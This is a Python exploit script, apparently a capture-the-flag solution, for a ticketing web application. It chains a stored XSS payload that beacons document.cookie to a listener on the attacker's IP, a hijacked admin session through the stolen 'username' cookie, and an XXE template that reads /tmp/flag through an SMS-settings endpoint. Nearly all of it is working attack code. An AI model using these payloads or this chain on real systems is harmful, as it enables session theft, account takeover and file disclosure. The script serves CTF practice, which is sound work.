#coding:utf-8
import re
import sys
import socket
import platform
import re
import sys
import requests as req
from pyquery import PyQuery as PQ
import string
import random
import re
import base64
class WebExp:
    def __init__(self, ip, port, csrfname = '_xsrf'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.username = 'qaqaqaqaqqaqq'
        self.password = 'qaqaqaqaqqaqq'
        self.mail = '233333@qaq.orz'
        self.csrfname = csrfname
        self.integral = None
        self.session = req.session()

    def _generate_randstr(self, len = 10):
        return ''.join(random.sample(string.ascii_letters, len))

    def _get_uuid(self, html):
        dom = PQ(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y

    def _get_user_integral(self):
        res = self.session.get(self.url + 'user')
        dom = PQ(res.text)
        res = dom('div.user-info').text()
        integral = re.search('(\d+\.\d+)', res).group()
        return integral

    def _get_token(self, html):
        dom = PQ(html)
        form = dom("form")
        token = str(PQ(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def login_test(self):
        rs = self.session.get(self.url + 'login')
        html = rs.text
        token = self._get_token(html)
        x, y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'login', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "captcha_x": x,
            "captcha_y": y
        })
        try:
            dom = PQ(rs.text)
            error = dom("div.alert.alert-danger")
            error = PQ(error).text().strip()
            if len(error):
                print "[-] Login failed."
                return False
        except:
            pass
        print "[+] Login Success."
        return True

    def register_test(self, invite = ''):
        rs = self.session.get(self.url + 'register')
        html = rs.text
        token = self._get_token(html)
        x, y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'register', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "password_confirm": self.password,
            "mail": self.mail,
            "invite_user": invite,
            "captcha_x": x,
            "captcha_y": y,
        })
        try:
            dom = PQ(rs.text)
            error = dom("div.alert.alert-danger")
            error = PQ(error).text().strip()
            if len(error):
                print "[-] Register failed."
                return False
        except:
            pass
        print "[+] Register Success."
        return True

    def exp(self):

        # get local ip address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        print ip
        s.close()

        self.register_test()
        self.login_test()

        rs = self.session.get(self.url + 'tickets')
        payload='b=document.cookie;a="<img src=http://{}:8234/"+btoa(b)+">";document.write(a);'.format(ip)
        payload=base64.b16encode(payload)
        #token = self._get_token(rs.text)
        payload = '![dsa](x"onerror=eval(atob(\'{}\'))%")'.format(payload)
        #print self.url + 'tickets/create'
        rs=self.session.get(self.url + 'tickets/create')
        token=self._get_token(rs.text)
        #print token
        rs = self.session.post(url=self.url + 'tickets/create', data={
            self.csrfname: token,
            "title": "hhh",
            "wmd-input": payload
        })

        s = socket.socket()
        s.bind(("127.0.0.1", 8234))
        s.listen(5)
        print("start listening ...")
        while True:
            con,address = s.accept()
            buf=con.recv(1024)
            if 'GET' in buf:
                break
        cookie=re.search(r'/\w+=*\s',buf).string
        cookie=cookie.strip().split('/')[1]
        cookie=base64.b64decode(cookie)
        value=re.search(r'"(.+)"', cookie)
        if value:
            value=value.group(1)

        self.session.cookies.set('username',None)
        self.session.cookies.set('username', value)
        rs=self.session.get(self.url+'settings/sms')
        token=self._get_token(rs.text)
        rs=self.session.post(url=self.url+'settings/sms',data={
            self.csrfname: token,
            "force_phone_check": "on"
        })
        rs=self.session.post(url=self.url+'settings/sms',data={
            self.csrfname: token,
            "force_phone_check": "on",
            "api_url":"http://127.0.0.1:8200/api/send_sms",
            "method":"1",
            "name":"data",
            "template":u'''
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE xdsec [ <!ENTITY xxe SYSTEM "file:///tmp/flag" >
            ]>
            <root>
                <tel>{tel}</tel>
            <text>【VYG乐购】您的验证码为： {code} &xxe;</text>
            </root>
            '''
        })
        #print rs.text
        print "soluntion1:"+self.session.get(self.url+'user/check/regen').text
        print "soluntion2:"+self.session.get(self.url+'user/2?super_admin_mode=1').text
        return True

def exp(host, port):
    exploit = WebExp(str(host), str(port), "_xsrf")
    return exploit.exp()

if __name__ == '__main__':
    '''
    if len(sys.argv) != 4:
        print("Wrong Params")
        print("example: python %s %s %s" % (sys.argv[0], '127.0.0.1', '8233'))
        exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    exp(ip, port)
    '''
    exp("localhost", 8233)





